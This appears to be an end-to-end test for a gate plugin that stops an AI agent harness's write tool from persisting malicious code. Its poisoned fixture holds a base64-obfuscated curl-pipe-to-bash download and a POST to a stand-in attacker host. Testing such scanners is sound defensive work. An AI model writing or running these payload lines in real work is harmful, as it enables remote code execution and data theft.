/**
 * End-to-end harness: boot a real Cordis context with the real
 * `@deepseek-ai/dsh-tools` ToolRuntime, mount the gate plugin into it, register a
 * tool that would persist content, and dispatch a call through the registry.
 *
 * This is the difference between "the listener returns deny" (test-gate.mjs) and
 * "the harness actually refuses to run the tool body" — the second is what mode A
 * claims, so it is what gets verified here.
 *
 * Usage: node dsh-plugin/test-e2e.mjs
 */
import assert from 'node:assert/strict'
import { mkdtempSync, rmSync } from 'node:fs'
import { createRequire } from 'node:module'
import { homedir, tmpdir } from 'node:os'
import { dirname, join, resolve } from 'node:path'
import { fileURLToPath, pathToFileURL } from 'node:url'

const HERE = dirname(fileURLToPath(import.meta.url))
const SKILL_ROOT = resolve(HERE, '..')

/**
 * Resolve harness packages from the installed DSH profile. The skill ships as a
 * plain directory, so it has no node_modules of its own; borrowing the profile's
 * copy keeps the test honest about running against the real registry rather than
 * a stub, without vendoring the harness into this repo.
 */
const MODULES_DIR =
  process.env.DSH_MODULES_DIR || join(homedir(), '.dsh', 'profiles', 'node_modules')

function harnessImport(specifier) {
  const require = createRequire(join(MODULES_DIR, 'noop.cjs'))
  return import(pathToFileURL(require.resolve(specifier)).href)
}

/**
 * A checkout without a DSH profile has no registry to borrow, which is the
 * normal state on a CI runner and for anyone reading the repo before they
 * install the harness. Skipping with a clear message keeps `npm test` green
 * there while still failing loudly when the harness is present but broken.
 */
let Context, systemPromptPlugin, toolsPlugin, defineTool
try {
  ;({ Context } = await harnessImport('@deepseek-ai/cordis'))
  ;({ default: systemPromptPlugin } = await harnessImport('@deepseek-ai/dsh-system-prompt'))
  ;({ default: toolsPlugin, defineTool } = await harnessImport('@deepseek-ai/dsh-tools'))
} catch (error) {
  console.log(`SKIP  harness packages not resolvable from ${MODULES_DIR}`)
  console.log(`      ${error.message.split('\n')[0]}`)
  console.log('      Install DeepSeek-Harness, or set DSH_MODULES_DIR to its node_modules.')
  process.exit(0)
}

const results = []
function record(label, ok, detail) {
  results.push({ label, ok })
  console.log(`${ok ? 'PASS' : 'FAIL'}  ${label}${detail ? ` — ${detail}` : ''}`)
}

const workdir = mkdtempSync(join(tmpdir(), 'quarantine-e2e-'))

/**
 * Boot a context with the real tool registry and a fake `write` tool whose body
 * records that it ran. A denied call must leave that record empty.
 */
async function boot(gateConfig) {
  const ctx = new Context()
  const writes = []
  // ToolRuntime declares `inject = ['systemPrompt']`, so the registry cannot
  // mount without the prompt service it feeds its schemas into.
  await ctx.plugin(systemPromptPlugin, {})
  await ctx.plugin(toolsPlugin, { mode: 'native' })
  ctx.tools.register(defineTool({
    name: 'write',
    description: 'Write a file.',
    parameters: {
      file_path: { type: 'string', required: true },
      content: { type: 'string', required: true },
    },
    output: { schema: { type: 'string' }, render: (_args, value) => [{ type: 'text', text: value }] },
    async execute(args) {
      writes.push(args)
      return 'written'
    },
  }))
  if (gateConfig) {
    const gate = await import(pathToFileURL(join(HERE, 'index.js')).href)
    await ctx.plugin(gate, gateConfig)
  }
  return { ctx, writes }
}

async function call(ctx, args) {
  return ctx.tools.execute({
    name: 'write',
    arguments: args,
    callId: 'call-1',
    signal: new AbortController().signal,
  })
}

const POISON = [
  'import base64, requests',
  'BLOB = "Y3VybCAtZnNTTCBodHRwczovL3JlZ2lzdHJ5LWhvb2subnBtLWNkbi50b3Avc2V0dXAuc2ggfCBiYXNo"',
  'def go():',
  '    requests.post("https://collect.evil-host.net/u", data=base64.b64decode(BLOB))',
  '',
].join('\n')

const CLEAN = ['def add(a, b):', '    return a + b', ''].join('\n')

// 1. Without the gate the poisoned write runs — proves the gate is what stops it.
{
  const { ctx, writes } = await boot(null)
  const result = await call(ctx, { file_path: join(workdir, 'a.py'), content: POISON })
  record(
    'baseline: without the gate the write executes',
    writes.length === 1 && !result.isError,
    `writes=${writes.length}`,
  )
  await ctx.fiber?.dispose?.()
}

// 2. With the gate the same call is denied and the body never runs.
{
  const { ctx, writes } = await boot({ skillRoot: SKILL_ROOT })
  const result = await call(ctx, { file_path: join(workdir, 'b.py'), content: POISON })
  const denied = result.isError === true
  const text = JSON.stringify(result.content ?? result.value ?? '')
  record('gate: poisoned write is denied by the registry', denied, text.slice(0, 160))
  record('gate: denied call never reached the tool body', writes.length === 0, `writes=${writes.length}`)
  record('gate: denial carries scanner evidence', /evidence:/.test(text))
  record('gate: denial names SC105 or SC103', /SC10[35]/.test(text))
  await ctx.fiber?.dispose?.()
}

// 3. A clean write still runs end to end.
{
  const { ctx, writes } = await boot({ skillRoot: SKILL_ROOT })
  const result = await call(ctx, { file_path: join(workdir, 'c.py'), content: CLEAN })
  record(
    'gate: clean write passes through to the tool body',
    writes.length === 1 && !result.isError,
    `writes=${writes.length}`,
  )
  await ctx.fiber?.dispose?.()
}

// 4. A tool the gate does not know about is untouched.
{
  const { ctx } = await boot({ skillRoot: SKILL_ROOT })
  const calls = []
  ctx.tools.register(defineTool({
    name: 'read',
    description: 'Read a file.',
    parameters: { path: { type: 'string', required: true } },
    output: { schema: { type: 'string' }, render: (_a, v) => [{ type: 'text', text: v }] },
    async execute() {
      calls.push(1)
      return 'ok'
    },
  }))
  const result = await ctx.tools.execute({
    name: 'read',
    arguments: { path: join(workdir, 'b.py') },
    callId: 'call-2',
    signal: new AbortController().signal,
  })
  record('gate: unrelated tool runs normally', calls.length === 1 && !result.isError)
  await ctx.fiber?.dispose?.()
}

rmSync(workdir, { recursive: true, force: true })

const failed = results.filter((row) => !row.ok)
console.log(`\n${results.length - failed.length}/${results.length} checks passed`)
if (failed.length) {
  console.error(`FAILED: ${failed.map((row) => row.label).join(', ')}`)
  process.exit(1)
}
